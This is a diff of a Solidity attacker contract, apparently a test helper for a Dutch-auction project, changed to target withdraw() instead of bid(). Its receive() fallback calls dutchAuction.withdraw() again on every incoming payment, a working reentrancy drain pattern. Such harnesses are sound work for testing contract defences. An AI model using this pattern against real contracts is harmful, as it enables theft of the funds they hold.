@@ -4,9 +4,8 @@ pragma solidity ^0.8.13;
 import {IDutchAuction} from "src/interfaces/IDutchAuction.sol";
 import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
 
-contract ReentrancyAttackOnBid is Ownable {
+contract ReentrancyAttackOnWithdraw is Ownable {
     IDutchAuction private dutchAuction;
-    uint256 private attackAmount;
     
     constructor(address _dutchAuctionAddress) Ownable(msg.sender) {
         dutchAuction = IDutchAuction(_dutchAuctionAddress);
@@ -18,14 +17,15 @@ contract ReentrancyAttackOnBid is Ownable {
         require(result, "Withdrawal failed.");
     }
 
-    function attack() external onlyOwner payable {
-        attackAmount = msg.value;
+    function bid() external onlyOwner payable {
         dutchAuction.bid{value: msg.value}();
     }
 
+    function attack() external onlyOwner {
+        dutchAuction.withdraw();
+    }
+
     receive() external payable {
-        if (address(this).balance >= attackAmount) {
-            dutchAuction.bid{value: attackAmount}();
-        }
+        dutchAuction.withdraw();
     }
 }
